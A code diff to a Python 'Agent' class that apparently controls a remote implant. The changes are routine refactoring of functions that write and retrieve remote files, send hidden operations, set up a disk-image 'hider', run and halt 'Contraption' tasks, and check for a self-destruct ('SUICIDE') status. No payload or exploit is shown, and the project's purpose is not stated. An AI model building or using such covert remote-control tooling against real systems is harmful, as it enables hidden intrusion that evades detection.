@@ -48,16 +48,16 @@ class Agent:
         except Exception as e:
             print(e)
 
-    def write_file(self, homeFilePath, targetFileName: str) -> Responce:
+    def write_file(self, homeFilePath, targetFileName: str) -> tuple[Responce, str]:
 
         with open(homeFilePath, "rb") as file:
             fileContent = file.read()
 
         self.conn.send_command(
-            Command(ic(len(fileContent)), FunCode.WRITE_FILE, 0, targetFileName)
+            Command(len(fileContent), FunCode.WRITE_FILE, 0, targetFileName)
         )
         self.conn.send_data(fileContent)
-        return self.conn.recv_responce_struct()
+        return self.conn.recv_full_responce()
 
     def retrieve_file(self, fileName) -> tuple[Responce, bytes]:
         self.conn.send_command(
@@ -93,7 +93,7 @@ class Agent:
 
         self.conn.send_command(
             Command(
-                ic(len(fileContent)),
+                len(fileContent),
                 FunCode.HIDDEN_OPRATION | fncode,
                 0,
                 targetFileName,
@@ -107,14 +107,16 @@ class Agent:
         return self.conn.recv_full_responce(), results
 
     # prob redundant in future
-    def hider_setup(self, hiderPath: str, imagePath: str, mountPath: str) -> Responce:
+    def hider_setup(
+        self, hiderPath: str, imagePath: str, mountPath: str
+    ) -> tuple[Responce, str]:
         self.is_hider_active = True
         self.mountPath = mountPath
         # self.hiding_env_setup(imagePath)
 
         strParam = hiderPath  # +  ";" + imagePath + ";" + mountPath
         self.conn.send_command(Command(0, FunCode.HIDER_SETUP, 0, strParam))
-        return self.conn.recv_responce_struct()
+        return self.conn.recv_full_responce()
 
     def hiding_env_setup(self, imagePath: str):
         res = self.run_bash(f"file {imagePath}")
@@ -140,13 +142,15 @@ class Agent:
         assert res.status == Status.SUICIDE_SUCSESS, "FAILED TO SUICIDE"
         return res
 
-    def runContraption(self, params: ContParams, identifier: int):
+    def runContraption(
+        self, params: ContParams, identifier: int
+    ) -> tuple[Responce, str]:
         self.conn.send_command(Command(0, FunCode.RunContraption, identifier, ""))
         self.conn.send_data(bytes(params))
-        res = self.conn.recv_responce_struct()
+        res = self.conn.recv_full_responce()
         return res
 
-    def haltContraption(self, identifier: int):
+    def haltContraption(self, identifier: int) -> tuple[Responce, str]:
         self.conn.send_command(Command(0, FunCode.HaltContraption, identifier, ""))
-        res = self.conn.recv_responce_struct()
+        res = self.conn.recv_full_responce()
         return res
